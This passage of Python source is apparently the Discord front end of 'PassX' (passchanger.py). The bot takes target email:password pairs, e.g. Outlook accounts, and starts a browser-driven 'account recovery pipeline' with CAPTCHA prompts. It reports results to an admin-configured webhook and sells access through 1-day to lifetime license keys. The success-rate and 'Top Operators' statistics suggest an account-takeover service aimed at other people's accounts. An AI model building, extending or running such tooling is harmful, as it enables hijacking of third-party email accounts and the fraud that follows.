@app_commands.describe(code="The 6-digit code from your DMs")
@check_auth()
async def verify_otp(i: discord.Interaction, code: str):
    success, msg = data_manager.verify_otp(i.user.id, code.strip())
    if success:
        await i.response.send_message(embed=ok(
            "Session Activated",
            f"{E_TICK()}  {msg}\n\nRun `/process email:password` to begin."
        ))
    else:
        await i.response.send_message(
            embed=err("Verification Failed", f"{E_CROSS()}  {msg}"), ephemeral=True
        )


@bot.tree.command(name="logout", description="End your active session")
@check_login()
async def logout_command(i: discord.Interaction):
    data_manager.logout(i.user.id)
    await i.response.send_message(embed=info(
        "Session Ended",
        f"{E_UPDATES()}  Signed out. Use `/request_otp` to log back in."
    ))


@bot.tree.command(name="process", description="Start the account recovery pipeline")
@app_commands.describe(account="Format: email:password")
@check_login()
async def process_account(i: discord.Interaction, account: str):
    uid = i.user.id

    if ":" not in account:
        await i.response.send_message(
            embed=err("Invalid Format",
                      f"{E_CROSS()}  Expected `email:password`\nExample: `user@outlook.com:Pass123`"),
            ephemeral=True
        )
        return

    if uid in data_manager.processing_sessions:
        await i.response.send_message(
            embed=warn("Already Running",
                       f"{E_ALERT()}  You have an active process.\nUse `/cancel` to abort first."),
            ephemeral=True
        )
        return

    email, password = account.split(":", 1)
    email, password = email.strip(), password.strip()

    await i.response.send_message(embed=brand(
        "Pipeline Initiated",
        f"{E_RECORD()}  Target: `{email}`\n\n"
        f"{E_UPDATES()}  Live progress tracker will appear below."
    ))

    asyncio.create_task(process_account_full(email, password, uid, i.channel))


@bot.tree.command(name="submit_captcha", description="Submit your CAPTCHA answer")
@app_commands.describe(text="The text shown in the CAPTCHA image")
@check_login()
async def submit_captcha(i: discord.Interaction, text: str):
    uid = i.user.id
    if uid not in data_manager.processing_sessions:
        await i.response.send_message(
            embed=warn("No Active CAPTCHA", f"{E_ALERT()}  Nothing is waiting for input."),
            ephemeral=True
        )
        return
    await continue_after_captcha(uid, text.strip(), i)


@bot.tree.command(name="status", description="Check your session and pipeline state")
@check_login()
async def check_status(i: discord.Interaction):
    uid    = i.user.id
    fields = [{"name": f"{E_BOOK()}  Auth", "value": f"{E_TICK()}  Active", "inline": True}]

    if uid in data_manager.processing_sessions:
        s = data_manager.processing_sessions[uid]
        fields += [
            {"name": f"{E_SETTINGS()}  Pipeline", "value": f"{E_ALERT()}  CAPTCHA Pending", "inline": True},
            {"name": f"{E_MAIL()}  Target",        "value": f"`{s['email']}`",               "inline": False},
            {"name": f"{E_RECORD()}  Attempts",    "value": f"{s['captcha_attempts']} / 3",  "inline": True},
            {"name": f"{E_PIN()}  Channel",        "value": f"<#{s['channel_id']}>",         "inline": True},
        ]
        emb = warn("Active Pipeline", f"{E_ALERT()}  CAPTCHA is waiting for your input.", fields)
    else:
        fields.append({"name": f"{E_SETTINGS()}  Pipeline",
                       "value": f"{E_TICK()}  Idle — ready", "inline": True})
        emb = ok("All Clear", f"{E_TICK()}  No active process. Run `/process` to begin.", fields)

    await i.response.send_message(embed=emb, ephemeral=True)


@bot.tree.command(name="cancel", description="Cancel your current processing session")
@check_login()
async def cancel_process(i: discord.Interaction):
    uid = i.user.id
    if uid not in data_manager.processing_sessions:
        await i.response.send_message(
            embed=info("Nothing to Cancel", f"{E_UPDATES()}  No active process found."),
            ephemeral=True
        )
        return

    session = data_manager.processing_sessions[uid]
    prog: Progress = session.get("progress")
    if prog:
        for idx, state in enumerate(prog.step_states):
            if state in (ACTIVE, WAITING):
                await prog.step_fail(idx, f"{E_CROSS()}  **Cancelled by user.**")
                break

    _cleanup(uid, session.get("driver"), session)
    await i.response.send_message(
        embed=ok("Cancelled", f"{E_TICK()}  Pipeline aborted. All resources released.")
    )


# ═══════════════════════════════════════════════
#  COMMANDS — ADMIN
# ═══════════════════════════════════════════════
@bot.tree.command(name="admin", description="[Admin] Control panel")
async def admin_panel(i: discord.Interaction):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator only."), ephemeral=True
        )
        return
    s = data_manager.stats
    await i.response.send_message(embed=adm(
        "PassX Control Panel", "Administration overview",
        [
            {"name": f"{E_BOOK()}  Users",
             "value": f"Auth'd: **{len(data_manager.authorized_users)}**\nSessions: **{len(data_manager.active_sessions)}**",
             "inline": True},
            {"name": f"{E_RECORD()}  Live",
             "value": f"Pipelines: **{len(data_manager.processing_sessions)}**",
             "inline": True},
            {"name": f"{E_UPDATES()}  Stats",
             "value": f"Total: **{s['total_processed']}**\n{E_TICK()} {s['total_success']}  {E_CROSS()} {s['total_failed']}",
             "inline": True},
            {"name": f"{E_PIN()}  Webhook",
             "value": f"{E_TICK()} Configured" if data_manager.config.get("webhook_url") else f"{E_CROSS()} Not set",
             "inline": True},
            {"name": f"{E_SETTINGS()}  Commands",
             "value": "`/authorize` `/revoke` `/list_users` `/set_webhook` `/stats`",
             "inline": False},
        ]
    ), ephemeral=True)


@bot.tree.command(name="authorize", description="[Admin] Grant a user access")
@app_commands.describe(user="User to authorize")
async def authorize_user(i: discord.Interaction, user: discord.User):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator only."), ephemeral=True
        )
        return
    if data_manager.is_authorized(user.id):
        await i.response.send_message(
            embed=info("Already Authorized", f"{E_TICK()}  {user.mention} already has access."),
            ephemeral=True
        )
        return
    data_manager.authorize_user(user.id, i.user.id)
    await i.response.send_message(embed=ok(
        "Access Granted",
        f"{E_TICK()}  {user.mention} added to the access list.",
        [{"name": f"{E_MAIL()}  User ID", "value": f"`{user.id}`", "inline": True}]
    ))
    try:
        await user.send(embed=ok(
            "Access Granted!",
            f"{E_TICK()}  Authorized by **{i.user.name}**.\nRun `/help` to get started."
        ))
    except Exception:
        pass


@bot.tree.command(name="revoke", description="[Admin] Remove user access")
@app_commands.describe(user="User to revoke")
async def revoke_user(i: discord.Interaction, user: discord.User):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator only."), ephemeral=True
        )
        return
    if user.id == ADMIN_ID:
        await i.response.send_message(
            embed=err("Blocked", f"{E_CROSS()}  Cannot revoke the administrator."), ephemeral=True
        )
        return
    data_manager.revoke_user(user.id)
    await i.response.send_message(
        embed=ok("Revoked", f"{E_TICK()}  {user.mention}'s access removed.")
    )


@bot.tree.command(name="list_users", description="[Admin] View all authorized users")
async def list_users(i: discord.Interaction):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator only."), ephemeral=True
        )
        return
    lines = []
    for uid in data_manager.authorized_users:
        try:
            u = await bot.fetch_user(int(uid))
            lines.append(f"{E_TICK()}  **{u.name}** — `{uid}`")
        except Exception:
            lines.append(f"{E_UPDATES()}  Unknown — `{uid}`")
    body = "\n".join(lines) if lines else f"{E_CROSS()}  No users on the access list."
    await i.response.send_message(embed=adm("Access List", body), ephemeral=True)


@bot.tree.command(name="set_webhook", description="[Admin] Set the results webhook URL")
@app_commands.describe(webhook_url="Discord webhook URL")
async def set_webhook(i: discord.Interaction, webhook_url: str):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator only."), ephemeral=True
        )
        return
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        await i.response.send_message(
            embed=err("Invalid URL", f"{E_CROSS()}  Must be a valid Discord webhook URL."),
            ephemeral=True
        )
        return
    data_manager.config["webhook_url"] = webhook_url
    data_manager.save_config()
    await i.response.send_message(
        embed=ok("Webhook Set", f"{E_TICK()}  Results will now dispatch to the webhook."),
        ephemeral=True
    )


@bot.tree.command(name="stats", description="[Admin] View detailed statistics")
async def view_stats(i: discord.Interaction):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator only."), ephemeral=True
        )
        return
    s    = data_manager.stats
    rate = (s["total_success"] / s["total_processed"] * 100) if s["total_processed"] else 0
    top  = sorted(s["users_served"].items(), key=lambda x: x[1]["processed"], reverse=True)[:5]
    top_text = "\n".join(
        f"{E_TICK()}  <@{uid}> — {d['processed']} processed ({d['success']} success)"
        for uid, d in top
    ) or f"{E_UPDATES()}  No data yet."
    await i.response.send_message(embed=adm(
        "Performance Metrics", SEP,
        [
            {"name": f"{E_UPDATES()}  Volume",
             "value": f"Total: **{s['total_processed']}**\n{E_TICK()} {s['total_success']}  {E_CROSS()} {s['total_failed']}",
             "inline": True},
            {"name": f"{E_RECORD()}  Success Rate", "value": f"**{rate:.1f}%**", "inline": True},
            {"name": f"{E_BOOK()}  Users",
             "value": f"Auth'd: **{len(data_manager.authorized_users)}**\nActive: **{len(data_manager.active_sessions)}**",
             "inline": True},
            {"name": f"{E_PIN()}  Top Operators", "value": top_text, "inline": False},
        ]
    ), ephemeral=True)


# ═══════════════════════════════════════════════
#  LICENSE / KEY SYSTEM
# ═══════════════════════════════════════════════

@bot.tree.command(name="redeem", description="Redeem a PassX license key")
@app_commands.describe(key="Your key e.g. PASSX-AB12-CD34-EF56")
async def redeem_cmd(i: discord.Interaction, key: str):
    uid = i.user.id
    success, result = redeem_key(key.strip().upper(), uid)
    if not success:
        await i.response.send_message(
            embed=err("Invalid Key", f"{E_CROSS()}  {result}"), ephemeral=True
        )
        return
    plan  = result
    label = KEY_LABELS[plan]
    # Auto-authorize
    if not data_manager.is_authorized(uid):
        data_manager.authorize_user(uid, "key_system")
    lic = get_user_license(uid)
    exp_str = "Never — Lifetime" if not lic["expires_at"] else datetime.fromisoformat(lic["expires_at"]).strftime("%d %b %Y %H:%M UTC")
    await i.response.send_message(embed=ok(
        "Key Redeemed!",
        f"{E_TICK()}  **{label}** license activated.",
        [
            {"name": f"{E_BOOK()}  Plan",    "value": f"`{label}`", "inline": True},
            {"name": f"{E_PIN()}  Expires",  "value": exp_str,      "inline": True},
            {"name": f"{E_UPDATES()}  Next", "value": "Use `/request_otp` to log in.", "inline": False},
        ]
    ), ephemeral=True)
    try:
        dm = discord.Embed(title=f"{E_DIAMOND()}  PassX License Activated", color=C_SUCCESS, timestamp=datetime.now())
        dm.add_field(name="Plan",    value=f"`{label}`", inline=True)
        dm.add_field(name="Expires", value=exp_str,      inline=True)
        dm.set_footer(text=FOOTER)
        await i.user.send(embed=dm)
    except Exception:
        pass


@bot.tree.command(name="mylicense", description="Check your active license")
async def my_license(i: discord.Interaction):
    lic = get_user_license(i.user.id)
    if not lic:
        await i.response.send_message(embed=err(
            "No License",
            f"{E_CROSS()}  No active license.\nAsk admin for a key and use `/redeem <key>`."
        ), ephemeral=True)
        return
    if lic["expires_at"]:
        exp       = datetime.fromisoformat(lic["expires_at"])
        remaining = exp - datetime.now()
        exp_str   = exp.strftime("%d %b %Y %H:%M UTC")
        left      = f"{remaining.days}d {remaining.seconds//3600}h remaining"
    else:
        exp_str = "Never"
        left    = "Lifetime"
    await i.response.send_message(embed=ok(
        "Your License",
        f"{E_TICK()}  License is active.",
        [
            {"name": f"{E_BOOK()}  Plan",        "value": f"`{lic['label']}`", "inline": True},
            {"name": f"{E_PIN()}  Expires",      "value": exp_str,             "inline": True},
            {"name": f"{E_UPDATES()}  Remaining","value": left,                "inline": True},
        ]
    ), ephemeral=True)


@bot.tree.command(name="genkey", description="[Admin] Generate a license key")
@app_commands.describe(plan="Key duration")
@app_commands.choices(plan=[
    app_commands.Choice(name="1 Day",    value="1day"),
    app_commands.Choice(name="7 Days",   value="7day"),
    app_commands.Choice(name="30 Days",  value="30day"),
    app_commands.Choice(name="Lifetime", value="lifetime"),
])
async def gen_key_cmd(i: discord.Interaction, plan: str):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(embed=err("Access Denied", f"{E_CROSS()}  Admin only."), ephemeral=True)
        return
    key   = generate_key(plan)
    label = KEY_LABELS[plan]
    await i.response.send_message(embed=adm(
        "Key Generated",
        f"{E_TICK()}  New **{label}** key ready.",
        [
            {"name": f"{E_BOOK()}  Plan", "value": f"`{label}`",  "inline": True},
            {"name": f"{E_PIN()}  Key",   "value": f"```{key}```","inline": False},
            {"name": f"{E_UPDATES()}  Note","value": "One-time use only. Share privately.", "inline": False},
        ]
    ), ephemeral=True)


@bot.tree.command(name="listkeys", description="[Admin] View all generated keys")
async def list_keys_cmd(i: discord.Interaction):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(embed=err("Access Denied", f"{E_CROSS()}  Admin only."), ephemeral=True)
        return
    all_keys = list_all_keys()
    if not all_keys:
        await i.response.send_message(embed=info("No Keys", "No keys generated yet."), ephemeral=True)
        return
    icons = {"unused": "⚪", "active": f"{E_TICK()}", "active_lifetime": f"{E_DIAMOND()}", "expired": f"{E_CROSS()}"}
    lines = []
    for k in all_keys[-20:]:
        by  = f"<@{k['redeemed_by']}>" if k["redeemed_by"] else "—"
        exp = "Never" if not k["expires_at"] else datetime.fromisoformat(k["expires_at"]).strftime("%d/%m/%y")
        lines.append(f"{icons.get(k['status'],'•')} `{k['key']}` · **{k['label']}** · {by} · {exp}")
    unused  = sum(1 for k in all_keys if k["status"] == "unused")
    active  = sum(1 for k in all_keys if k["status"] in ("active","active_lifetime"))
    expired = sum(1 for k in all_keys if k["status"] == "expired")
    await i.response.send_message(embed=adm(
        "Key Registry", "\n".join(lines),
        [
            {"name": "⚪  Unused",       "value": str(unused),  "inline": True},
            {"name": f"{E_TICK()}  Active", "value": str(active),  "inline": True},
            {"name": f"{E_CROSS()}  Expired","value": str(expired), "inline": True},
        ]
    ), ephemeral=True)


@bot.tree.command(name="revokekey", description="[Admin] Revoke all keys for a user")
@app_commands.describe(user="User to revoke")
async def revoke_key_cmd(i: discord.Interaction, user: discord.User):
    if i.user.id != ADMIN_ID:
        await i.response.send_message(embed=err("Access Denied", f"{E_CROSS()}  Admin only."), ephemeral=True)
        return
    revoke_user_keys(user.id)
    data_manager.revoke_user(user.id)
    await i.response.send_message(embed=ok(
        "License Revoked",
        f"{E_TICK()}  All keys for {user.mention} expired and access removed."
    ), ephemeral=True)


# ═══════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════
if __name__ == "__main__":
    # Load from .env file if it exists
    if os.path.exists(".env"):
        with open(".env") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    os.environ.setdefault(k.strip(), v.strip())

    # Get token: env var first, then command line argument
    token = os.environ.get("DISCORD_TOKEN") or (sys.argv[1] if len(sys.argv) > 1 else None)

    if not token:
        print("\n  Bot token required.")
        print("  Usage: python passchanger.py <BOT_TOKEN>")
        print("  Or create a .env file with: DISCORD_TOKEN=your_token_here\n")
        sys.exit(1)

    try:
        bot.run(token)
    except discord.errors.LoginFailure:
        print("\n  Invalid token.\n")
    except KeyboardInterrupt:
        print("\n  Shutting down…\n")
    except Exception as e:
        print(f"\n  Fatal: {e}\n")
        traceback.print_exc()